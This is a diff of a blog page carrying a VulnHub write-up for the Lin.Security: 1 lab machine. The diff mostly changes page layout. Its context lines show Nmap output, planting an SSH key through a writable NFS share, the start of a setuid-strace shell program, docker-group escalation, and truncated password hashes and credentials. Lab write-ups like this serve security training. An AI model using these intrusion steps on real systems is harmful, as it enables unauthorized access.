@@ -7,7 +7,7 @@
     <meta content="width=device-width, initial-scale=1" name="viewport"/>
     <title>मंथन | Manthan</title>
     <link rel="icon" type="image/webp" sizes="32x32" href="/static/images/manthan-32x32.png.webp"/>
-    <link rel="stylesheet" type="text/css" media="screen" href="/static/css/style.rainbow.css"/>
+    <link rel="stylesheet" type="text/css" media="screen" href="/static/css/style.invisibletree.css"/>
     <link rel="stylesheet" href="/static/css/atelier-forest-light.css">
     <!-- <link rel="stylesheet" href="/static/css/atom-one-light.min.css"> -->
     <!-- <link rel="stylesheet" href="/static/css/default.min.css"> -->
@@ -20,23 +20,13 @@
     <script charset="UTF-8" src="/static/js/go.min.js"></script>
    </head>
   <body>
-    <div class="header">
-      <span class="menu_left"><a class="menu_home" href="/index.html">मंथन</a></span>
-      <span class="menu_right"><table>
-        <tr>
-          <td><a class="menu_archive" href="/archive.html">Archive</a></td><td>|</td>
-          <td><a class="menu_tags" href="/tags.html">Tags</a></td><td>|</td>
-          <td><a class="menu_stats" href="/stats.html">Stats</a></td>
-        </tr>
-      </table></span>
-      <br/><br/>
-    </div>
     <div class="body">
-      <h1 class="h1 collapsible" onclick="toggle(this);">[VulnHub] Lin.Security: 1</h1>
+      <div class="content">
+          <h1 class="h1 collapsible" onclick="toggle(this);">[VulnHub] Lin.Security: 1</h1>
           <p style="float:left;"><a href="/posts/20191010_vulnhub-lordoftheroot101.html"> « </a>📅 published on <code>10/Oct/2019</code><a href="/posts/20191011_vulnhub-misdirection1.html"> » </a></p>
         <p style="float:right;">🔖 tagged <a href=/tags.html#vulnhub>vulnhub</a> and <a href=/tags.html#writeup>writeup</a></p>
     <div style="clear:both;"></div>
-    <h2 class="h2 collapsible" onclick="toggle(this);">Overview</h2>
+    <br/><h2 class="h2 collapsible" onclick="toggle(this);">Overview</h2>
 <p class="nested">This is a writeup for VulnHub VM <a href="https://www.vulnhub.com/entry/linsecurity-1,244/">Lin.Security: 1</a>. Here are stats for this machine from <a href="https://github.com/7h3rAm/machinescli">machinescli</a>:</p>
 <p class="nested"><img alt="writeup.overview.machinescli" src="/static/files/posts_vulnhub_linsecurity1/machinescli.png.webp" /></p>
 <h3 class="h3 collapsible" onclick="toggle(this);">Killchain</h3>
@@ -44,7 +34,7 @@
 <p class="nested"><img alt="writeup.overview.killchain" src="/static/files/posts_vulnhub_linsecurity1/killchain.png.webp" /></p>
 <h3 class="h3 collapsible" onclick="toggle(this);">TTPs</h3>
 <p class="nested">1. <code>2049/tcp/nfs_acl/3 (RPC #100227)</code>: <a href="https://github.com/7h3rAm/writeups#exploit_nfs_rw">exploit_nfs_rw</a>, <a href="https://github.com/7h3rAm/writeups#exploit_ssh_authorizedkeys">exploit_ssh_authorizedkeys</a>, <a href="https://github.com/7h3rAm/writeups#privesc_strace_setuid">privesc_strace_setuid</a>, <a href="https://github.com/7h3rAm/writeups#privesc_docker_group">privesc_docker_group</a>  </p>
-<h2 class="h2 collapsible" onclick="toggle(this);">Phase #1: Enumeration</h2>
+<br/><h2 class="h2 collapsible" onclick="toggle(this);">Phase #1: Enumeration</h2>
 <p class="nested">1. Here's the Nmap scan result:  </p>
 <pre class="nested"><code># Nmap 7.70 scan initiated Wed Oct  9 19:28:13 2019 as: nmap -vv --reason -Pn -sV -sC --version-all -oN /root/toolbox/writeups/vulnhub.linsecurity1/results/192.168.92.186/scans/_quick_tcp_nmap.txt -oX /root/toolbox/writeups/vulnhub.linsecurity1/results/192.168.92.186/scans/xml/_quick_tcp_nmap.xml 192.168.92.186
 Nmap scan report for 192.168.92.186
@@ -101,7 +91,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 <h4 class="h4 collapsible" onclick="toggle(this);">Users</h4>
 <pre class="nested"><code>ssh: peter
 </code></pre>
-<h2 class="h2 collapsible" onclick="toggle(this);">Phase #2: Exploitation</h2>
+<br/><h2 class="h2 collapsible" onclick="toggle(this);">Phase #2: Exploitation</h2>
 <p class="nested">1. We mount this share locally and copy our SSH public key to the newly created <code>.ssh</code> directory within mounted NFS share:  </p>
 <pre class="nested"><code>cp ~/.ssh/id_rsa.pub ./authorized_keys
 mkdir share
@@ -124,7 +114,7 @@ cp ../authorized_keys .ssh/
 su susan
 </code></pre>
 <p class="nested"><img alt="writeup.exploitation.steps.3.1" src="/static/files/posts_vulnhub_linsecurity1/screenshot06.png.webp" />  </p>
-<h2 class="h2 collapsible" onclick="toggle(this);">Phase #2.5: Post Exploitation</h2>
+<br/><h2 class="h2 collapsible" onclick="toggle(this);">Phase #2.5: Post Exploitation</h2>
 <pre class="nested"><code>peter@linsecurity&gt; id
 uid=1001(peter) gid=1005(peter) groups=1005(peter),999(docker)
 peter@linsecurity&gt;  
@@ -146,7 +136,7 @@ bob
 peter
 susan
 </code></pre>
-<h2 class="h2 collapsible" onclick="toggle(this);">Phase #3: Privilege Escalation</h2>
+<br/><h2 class="h2 collapsible" onclick="toggle(this);">Phase #3: Privilege Escalation</h2>
 <p class="nested">1. We find that the user <code>peter</code> can run <code>strace</code> with elevated privileges. This gives us a option to elevate privileges by tracing a program that spawns a shell:  </p>
 <pre class="nested"><code>nano privesc.c
   #include &lt;stdlib.h&gt;
@@ -187,7 +177,7 @@ ssh insecurity@192.168.92.186
 </code></pre>
 <p class="nested"><img alt="writeup.privesc.steps.3.1" src="/static/files/posts_vulnhub_linsecurity1/screenshot12.png.webp" />  </p>
 <p class="nested"><img alt="writeup.privesc.steps.3.2" src="/static/files/posts_vulnhub_linsecurity1/screenshot13.png.webp" />  </p>
-<h2 class="h2 collapsible" onclick="toggle(this);">Loot</h2>
+<br/><h2 class="h2 collapsible" onclick="toggle(this);">Loot</h2>
 <h3 class="h3 collapsible" onclick="toggle(this);">Hashes</h3>
 <pre class="nested"><code>root:$6$aorWKpxj$yOgku4F1ZRbqvSxxUtAYY2/6K/UU5wLobTSz/Pw5/ILvXgq9NibQ0/NQbOr1Wzp2bTbpNQr1jNNlaGjXD........................
 bob:$6$Kk0DA.6Xha4nL2p5$jq7qoit2l4ckULg1ZxcbL5wUz2Ld2ZUa.RYaIMs.Lma0EFGheX9yCXfKy37K0GsHz50FYIqIESo4QXWL.........................
@@ -197,23 +187,66 @@ susan:$6$5oSmml7K$0joeavcuzw4qxDJ2LsD1ablUIrFhycVoIXL3rxN/3q2lVpQOKLufta5tqMRIh3
 <h3 class="h3 collapsible" onclick="toggle(this);">Credentials</h3>
 <pre class="nested"><code>ssh: bob/secr.., susan/MySuperS3cretV....., insecurity/P@ss....
 </code></pre>
-<h2 class="h2 collapsible" onclick="toggle(this);">References</h2>
+<br/><h2 class="h2 collapsible" onclick="toggle(this);">References</h2>
 <ul class="nested">
 <li><a href="https://www.vulnhub.com/entry/linsecurity-1,244/">https://www.vulnhub.com/entry/linsecurity-1,244/</a>  </li>
 <li><a href="https://in.security/lin-security-walkthrough/">https://in.security/lin-security-walkthrough/</a>  </li>
 <li><a href="https://hackso.me/lin.security-1-walkthrough/">https://hackso.me/lin.security-1-walkthrough/</a>  </li>
 </ul>
+    <hr>
           <p style="float:left;">« <a href="/posts/20191010_vulnhub-lordoftheroot101.html">[VulnHub] Lord Of The Root: 1....</a> «</p>
       <p style="float:right;">» <a href="/posts/20191011_vulnhub-misdirection1.html">[VulnHub] Misdirection: 1</a> »</p>
-        </div>
-    <div BG_CLIPART_STYLE_HERE></div>
-    <div class="footer footercenter">
-      <span>
-        <a href="https://github.com/7h3rAm/7h3rAm.github.io" class="footspan">  </a>
-      </span>
+          </div>
+      <div class="menu">
+        <h1 class="h1"><a class="menu_home" href="/index.html">मंथन</a></h1>
+          <ul class="active nested">
+            <li><a class="menu_archive" href="/archive.html">💾 Archive</a><ul class="active nested">
+              <li><a href=/pages/research.html>🔬 Research</a></li>
+              <li><a href=/pages/cv.html>📄 Curriculum Vitae</a></li>
+              <li><a href=/pages/satview.html>🛰️ Satellite Views</a></li>
+              <li><a href=/pages/fitness.html>🏋️ Fitness</a></li>
+              <li><a href=/pages/life.html>🧘 Life</a></li>
+            </ul></li>
+            <li><a class="menu_tags" href="/tags.html">🔖 Tags</a><ul class="active nested">
+                            <li><a href="/tags.html#code">code</a></li>
+                            <li><a href="/tags.html#ctf">ctf</a></li>
+                            <li><a href="/tags.html#exploit">exploit</a></li>
+                            <li><a href="/tags.html#hackthebox">hackthebox</a></li>
+                            <li><a href="/tags.html#reversing">reversing</a></li>
+                            <li><a href="/tags.html#tryhackme">tryhackme</a></li>
+                            <li><a href="/tags.html#vulnhub">vulnhub</a></li>
+                            <li><a href="/tags.html#vulnweekends">vulnweekends</a></li>
+                            <li><a href="/tags.html#writeup">writeup</a></li>
+                          </ul></li>
+            <li><a class="menu_stats" href="/stats.html">📊 Stats</a></li>
+          </ul>
+      </div>
+      <div class="footer footercenter"><span><a href="https://github.com/7h3rAm/7h3rAm.github.io" class="footspan">  </a></span></div>
+      <script>hljs.initHighlightingOnLoad();</script>
+      <script>hljs.initLineNumbersOnLoad();</script>
+      <script>
+        function toggle(s){
+          s.classList.toggle("expanded");
+          var t=!1,i=!1,a=!1;
+          s.classList.contains("h2")&&(t=!0),s.classList.contains("h3")&&(i=!0),s.classList.contains("h4")&&(a=!0);
+          for(var l=s.nextElementSibling;l;){
+            if(t&&l.classList.contains("h2")){
+              l.classList.toggle("active");
+              break
+            }
+            if(i&&(l.classList.contains("h2")||l.classList.contains("h3"))){
+              l.classList.toggle("active");
+              break
+            }
+            if(a&&(l.classList.contains("h2")||l.classList.contains("h3")||l.classList.contains("h4"))){
+              l.classList.toggle("active");
+              break
+            }
+            l.classList.contains("collapsible")&&l.classList.toggle("expanded"),l.classList.toggle("active"),l=l.nextElementSibling
+          }
+        }
+      </script>
     </div>
-    <script>hljs.initHighlightingOnLoad();</script>
-    <script>hljs.initLineNumbersOnLoad();</script>
-    <script>function toggle(s){s.classList.toggle("expanded");var t=!1,i=!1,a=!1;s.classList.contains("h2")&&(t=!0),s.classList.contains("h3")&&(i=!0),s.classList.contains("h4")&&(a=!0);for(var l=s.nextElementSibling;l;){if(t&&l.classList.contains("h2")){l.classList.toggle("active");break}if(i&&(l.classList.contains("h2")||l.classList.contains("h3"))){l.classList.toggle("active");break}if(a&&(l.classList.contains("h2")||l.classList.contains("h3")||l.classList.contains("h4"))){l.classList.toggle("active");break}l.classList.contains("collapsible")&&l.classList.toggle("expanded"),l.classList.toggle("active"),l=l.nextElementSibling}}</script>
+    <div id="bgclipart"></div>
   </body>
 </html>
